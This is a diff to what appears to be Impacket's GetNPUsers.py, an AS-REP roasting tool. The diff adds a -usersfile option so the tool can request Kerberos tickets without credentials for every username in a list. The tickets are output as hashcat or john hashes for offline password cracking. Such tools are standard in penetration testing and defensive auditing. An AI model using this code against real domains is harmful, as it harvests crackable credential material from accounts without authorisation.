@@ -70,6 +70,7 @@ class GetUserNoPreAuth:
         self.__no_pass = cmdLineOptions.no_pass
         self.__outputFileName = cmdLineOptions.outputfile
         self.__outputFormat = cmdLineOptions.format
+        self.__usersFile = cmdLineOptions.usersfile
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
         self.__requestTGT = cmdLineOptions.request
@@ -204,6 +205,11 @@ class GetUserNoPreAuth:
             else:
                 target = self.__domain
 
+        if self.__usersFile:
+            self.request_users_file_TGTs()
+            return
+
+
         # Are we asked not to supply a password?
         if self.__no_pass is True:
             # Yes, just ask the TGT and exit
@@ -300,22 +306,33 @@ class GetUserNoPreAuth:
             print '\n\n'
 
             if self.__requestTGT is True:
-                # Get a TGT for the current user
-                if self.__outputFileName is not None:
-                    fd = open(self.__outputFileName, 'w+')
-                else:
-                    fd = None
-                for answer in answers:
-                    try:
-                        entry = self.getTGT(answer[0])
-                        self.outputTGT(entry,fd)
-                    except Exception , e:
-                        logging.error('%s' % str(e))
-                if fd is not None:
-                    fd.close()
+                usernames = [answer[0] for answer in answers]
+                self.request_multiple_TGTs(usernames)
 
         else:
             print "No entries found!"
+
+    def request_users_file_TGTs(self):
+
+        with open(self.__usersFile) as fi:
+            usernames = [line.strip() for line in fi]
+
+        self.request_multiple_TGTs(usernames)
+
+    def request_multiple_TGTs(self, usernames):
+        if self.__outputFileName is not None:
+            fd = open(self.__outputFileName, 'w+')
+        else:
+            fd = None
+        for username in usernames:
+            try:
+                entry = self.getTGT(username)
+                self.outputTGT(entry, fd)
+            except Exception, e:
+                logging.error('%s' % str(e))
+        if fd is not None:
+            fd.close()
+
 
 
 # Process command-line arguments.
@@ -335,6 +352,8 @@ if __name__ == '__main__':
 
     parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat',
                         help='format to save the AS_REQ of users without pre-authentication. Default is hashcat')
+
+    parser.add_argument('-usersfile', help='File with user per line to test')
 
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
@@ -365,6 +384,9 @@ if __name__ == '__main__':
               "it will require you to have emily\'s password. (If you don\'t specify it, it will be asked by the script)"
         print "\n3. Request TGTs for all users"
         print "\n\tGetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily"
+        print "\n4. Request TGTs for users in a file"
+        print "\n\tGetNPUsers.py contoso.com/ -no-pass -usersfile users.txt"
+        print "\nFor this operation you don\'t need credentials."
         sys.exit(1)
 
     options = parser.parse_args()
